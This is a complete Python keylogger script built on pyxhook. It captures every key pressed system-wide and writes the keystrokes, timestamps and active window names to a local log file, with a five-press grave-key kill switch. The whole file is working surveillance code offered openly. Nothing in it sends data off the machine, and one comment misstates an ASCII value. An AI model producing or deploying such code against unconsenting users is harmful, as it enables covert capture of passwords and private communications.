import os

import pyxhook
import datetime

recordfile = "output.log"

kill_event = 0

time_event = ""

window = ""

with open(recordfile, "a") as f:
    f.write(datetime.datetime.now().strftime("%d/%m/%Y %H:%M"))
    f.write("\nStarted in PID {0}!".format(str(os.getpid())))
    f.close()


def OnKeyPress(event):
    global kill_event, time_event, window
    recordKey = open(recordfile, "a")
    if time_event != datetime.datetime.now().strftime("%d/%m/%Y %H:%M"):
        time_event = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
        recordKey.write("\nTime: {0}\n".format(time_event))
    if window != str(event.WindowName):
        window = str(event.WindowName)
        recordKey.write("\nWindow Name: {0}\n".format(str(window)))
    if event.Ascii == 32:  # 32 is the ascii value of space
        kill_event = 0
        recordKey.write(" ")
    elif event.Ascii == 13:  # 10 is the ascii value of <Return>
        kill_event = 0
        recordKey.write("\n")
    elif event.Ascii == 96:  # 96 is the ascii value of the grave key (`)
        kill_event += 1
        if kill_event >= 5:
            recordKey.write("Killed!")
            hook.cancel()
    else:
        kill_event = 0
        if 33 <= event.Ascii <= 126:
            recordKey.write(event.Key)
        else:
            recordKey.write("<{0}>".format(str(event.Key)))

    recordKey.close()


# initiate HookManager class
hook = pyxhook.HookManager()
# listen to all keys pressed
hook.KeyDown = OnKeyPress
# hook the keyboard
hook.HookKeyboard()
# start the key-logging
hook.start()
